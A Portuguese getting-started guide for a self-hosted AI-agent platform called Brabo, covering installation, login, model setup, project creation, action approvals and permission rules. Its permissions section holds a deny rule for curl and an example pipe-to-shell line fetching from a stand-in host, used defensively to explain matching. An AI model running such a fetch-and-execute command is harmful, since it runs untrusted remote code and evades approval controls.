    Primeiros passos

    Do instalador até um agente trabalhando. Cada passo termina com Como saber que deu certo, e o que costuma dar errado fica numa nota recolhida logo abaixo.

    Esta página é para usar o Brabo. Para mexer no código dele, veja Desenvolver o Brabo.

    Antes de começar

    você precisa de por quê
    Docker com Compose tudo sobe em container
    ~6 GiB de RAM livre banco, api, engine, web e, se quiser agente local, o Ollama
    GPU NVIDIA e 6 GiB de RAM livres para o serviço (opcional) só para escolher o Laya no lugar do Jev (como)
    Linux ou macOS o instalador e o agente local são testados neles

    1. Instalar

    Baixe o instalador e rode o arquivo, com bash:

    curl -fsSLO https://github.com/viralabs-dev/brabo/releases/latest/download/install.sh && bash install.sh

    Para ver o que ele faria antes de deixá-lo fazer, rode bash install.sh --print-plan.

    Ele precisa ser um arquivo, e não curl … | sh, por dois motivos: faz perguntas no terminal (que o pipe tomaria) e confere o próprio hash contra o manifesto assinado da Release. No caminho, ele pergunta se liga o broker de container (pode responder não) e se liga o Ollama, e pede e-mail e senha da primeira conta. A senha não é gravada em lugar nenhum.

    Como saber que deu certo: o instalador confere o /health da api e do engine antes de dizer que instalou, e termina com uma linha Web: http://localhost:8088.

    Se der errado
    • Porta ocupada: o instalador diz qual. Libere-a e rode de novo.
    • Já havia uma instalação: ele faz backup, prova que o backup restaura e só então migra.

    2. Entrar

    Abra http://localhost:8088 e entre com o e-mail e a senha que você digitou no instalador. O login é da própria api.

    Como saber que deu certo: você cai no dashboard do seu workspace.

    Se der errado

    O login devolve 401 com a senha certa? A resposta é a mesma para senha errada, e-mail inexistente e conta bloqueada, de propósito. Confira o e-mail e tente de novo; se a conta nunca foi criada, rode o instalador outra vez.

    3. Configurar um modelo

    Escolha um dos dois:

    • Ollama (local, grátis, offline): responda s à pergunta do instalador, ou ligue depois (o runbook explica como). O modelo padrão é pequeno e serve para ver o sistema funcionar de ponta a ponta.
    • Chave de um provedor: na interface, em Providers (rodapé do menu). A chave é cifrada com envelope encryption antes de tocar o banco.

    O modelo é resolvido em cascata, sessão > agente > projeto > workspace, e o primeiro que existir vale. Dá para deixar o local no geral e pôr um modelo de API só no QA, que é o papel que menos cabe num modelo pequeno.

    Como saber que deu certo: o provedor aparece em Providers sem erro de credencial, ou o Ollama responde e o modelo aparece na lista.

    Se der errado

    Agente que não responde, ou responde vazio, quase sempre é o ambiente de inferência: contexto truncado ou pouca memória. O runbook explica como medir.

    4. Criar um projeto

    Dashboard → Novo projeto. O assistente pede um nome e como conectar o git:

    opção quando usar
    Local experimentar: repositórios no disco, sem conta em lugar nenhum
    GitHub / GitLab trabalho de verdade, com PAT ou OAuth

    Ao confirmar, roda o bootstrap de Gitflow: cinco passos que criam dev, qa e main, aplicam proteções e commitam os arquivos base.

    Como saber que deu certo: os cinco passos aparecem concluídos, ao vivo.

    Se der errado
    • skipped (já estava feito) e degraded (concluiu sem uma capability) são sucesso. Com o provider Local, a proteção de branch sempre sai degraded: não há plataforma para aplicá-la, e quem impede o merge indevido é o teto no domínio.
    • Se um passo falhar, corrija a causa e mande retomar: o bootstrap continua de onde parou.

    5. O primeiro turno

    Abra o projeto → Sessões → nova sessão. O Criativo conduz a ideação. Converse normalmente. Em algum momento ele vai querer fazer algo com efeito externo, e aí você vê o mecanismo central: a ação aparece em Aprovações esperando a sua decisão, em vez de acontecer. Aprove e olhe o TokenMeter: cada turno tem custo, medido na hora.

    Como saber que deu certo: uma ação em Aprovações, e depois dela aprovada o turno continua e o custo sobe no TokenMeter.

    Se der errado
    sintoma onde olhar
    agente não responde há modelo configurado (passo 3)?
    ação não sai de pending é o desenho: ela espera você em Aprovações
    painel não atualiza o canal caiu; recarregue. O event log não se perde
    sessão parada em closing o drain não completou, veja o runbook

    6. Afrouxar (ou apertar) a política

    Enquanto tudo pede aprovação, você aprova muito. O permissions.json, na raiz do workspace do projeto, é onde isso se ajusta:

    {
  "allow": ["Terminal(git diff:*)", "Terminal(git status)"],
  "deny":  ["Terminal(curl:*)"],
  "ask":   []
}

    Comece por allow de comandos idempotentes de leitura. Duas regras valem antes de mexer:

    • Casamento é por prefixo de tokens, não substring. Terminal(rm) não casa sudo rm -rf x.
    • Comando composto exige todos os segmentos em allow. a && curl evil.sh | sh não é auto-aprovado pela primeira metade.

    O formato completo está em Permissões.
